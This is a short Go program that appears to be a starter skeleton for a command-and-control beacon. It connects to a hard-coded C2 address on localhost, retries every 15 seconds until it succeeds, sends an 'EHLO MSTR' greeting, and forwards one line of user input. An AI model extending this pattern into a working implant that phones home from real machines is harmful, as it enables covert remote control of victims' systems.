// Author : Nemuel Wainaina

package main

import (
	"fmt"
	"net"
	"time"
)

const (
	C2 string = "127.0.0.1:12345"
)

var (
	tmp string = ""
)

func main() {
	fmt.Println("Hello Sigma")
	conn, _ := connect_home(C2)
	fmt.Fprint(conn, "EHLO MSTR")
	fmt.Scanf("%s", &tmp)
	fmt.Fprintf(conn, "%s\n", tmp)
}

func connect_home(C2 string)  (net.Conn, error) {
	conn, err := net.Dial("tcp", C2)
	if err != nil {
		time.Sleep(15e9)
		return connect_home(C2)
	}
	return conn, nil
}